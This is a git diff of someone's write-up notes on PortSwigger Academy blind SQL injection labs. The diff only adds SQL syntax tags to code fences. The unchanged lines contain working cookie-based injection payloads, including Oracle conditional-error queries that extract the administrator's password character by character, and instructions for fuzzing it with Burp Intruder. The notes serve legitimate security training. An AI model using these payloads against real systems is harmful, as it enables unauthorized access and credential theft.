@@ -7,7 +7,7 @@
 ## Lab 10: Blind SQL injection with conditional responses [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#)
 - This injection will be used in `Cookie` section in `TrackingID` input field of the page.
 
-```
+```sql
 TrackingId=mCKLbQonMlRUp42B' AND '1'='1;  #Returns 'Welcome Back', This boolean condition means the page is vul to Bilnd SQLi
 TrackingId=mCKLbQonMlRUp42B' AND '1'='2; #Doesn't Returns 'Welcome Back' 
 
@@ -35,7 +35,7 @@ length: The number of characters to extract.
 ```
 
 ## Lab 11: Blind SQL injection with conditional errors [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
-```
+```sql
 If there is Error, means the Query is getting processed by Server & We can give conditions to test for the payloads
 
 TrackingId=3K2lIneuWTHL6FqO' Error
@@ -60,7 +60,7 @@ TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN LENGTH(password)>=20 THEN TO_CHA
 - Use Intruder's Sniper Attack type to fuzz the password by comparing each & every position from SUBSTR(password,1,1) to SUBSTR(password,20,1)
 - Copy each letter from result if recieved Error 500, use the same to login after extracting all 20 letters.
 
-```
+```sql
 TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  
 
 TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  
